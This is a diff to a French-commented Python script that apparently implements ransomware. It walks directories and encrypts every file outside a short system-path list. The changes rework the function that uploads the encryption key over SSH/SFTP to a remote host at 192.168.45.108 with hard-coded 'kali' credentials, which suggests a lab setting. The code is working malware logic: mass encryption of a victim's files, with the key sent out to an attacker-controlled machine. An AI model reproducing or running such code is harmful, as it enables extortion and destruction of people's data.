@@ -26,28 +26,31 @@ def load_key():
     return open("/root/secret.key", "rb").read()
 
 
-def send_key_to_sftp(key):
-    """Envoie la clé de chiffrement au serveur SFTP."""
-    sftp_host = "192.168.45.108"  # Remplace avec ton hôte SFTP
-    sftp_port = 22  # Port SFTP (généralement 22)
-    sftp_username = "kali"  # Nom d'utilisateur pour SFTP
-    sftp_password = "kali"  # Mot de passe pour SFTP
-    remote_path = "/secret.key"  # Chemin distant où la clé sera envoyée
+def send_key_via_ssh(key):
+    """Envoie la clé de chiffrement au serveur distant via SSH."""
+    ssh_host = "192.168.45.108"  # Adresse IP du serveur
+    ssh_port = 22  # Port SSH
+    ssh_username = "kali"  # Nom d'utilisateur SSH
+    ssh_password = "kali"  # Mot de passe SSH
+    remote_path = "/home/kali/secret.key"  # Chemin distant pour la clé
 
     try:
-        transport = paramiko.Transport((sftp_host, sftp_port))
-        transport.connect(username=sftp_username, password=sftp_password)
-        sftp = paramiko.SFTPClient.from_transport(transport)
-        # Sauvegarde de la clé dans un fichier temporaire
+        # Établir la connexion SSH
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(ssh_host, port=ssh_port, username=ssh_username, password=ssh_password)
+
+        # Transférer le fichier via SCP (SSH)
+        sftp = ssh.open_sftp()
         with open("/root/secret.key", "wb") as f:
             f.write(key)
-        # Envoi du fichier vers le serveur SFTP
         sftp.put("/root/secret.key", remote_path)
         sftp.close()
-        transport.close()
-        print(f"Clé envoyée à {sftp_host}:{remote_path}")
+        ssh.close()
+
+        print(f"Clé envoyée via SSH à {ssh_host}:{remote_path}")
     except Exception as e:
-        print(f"Erreur lors de l'envoi de la clé via SFTP: {e}")
+        print(f"Erreur lors de l'envoi de la clé via SSH: {e}")
 
 
 def encrypt_file(file_path, cipher):
@@ -77,11 +80,9 @@ def decrypt_file(file_path, cipher):
 def process_directory(directory, cipher, encrypt=True):
     """Parcourt un dossier et chiffre/déchiffre chaque fichier tout en évitant les fichiers critiques du système."""
     system_exclude = ["/proc", "/sys", "/dev", "/run", "/tmp", "/boot", "/root/secret.key"]
-
     for root, _, files in os.walk(directory):
         if any(root.startswith(excl) for excl in system_exclude):
             continue
-
         for file in files:
             file_path = os.path.join(root, file)
             try:
@@ -107,7 +108,7 @@ if __name__ == "__main__":
 
     if action == 'E':
         key = generate_key()
-        send_key_to_sftp(key)
+        send_key_via_ssh(key)
     else:
         key = load_key()
 
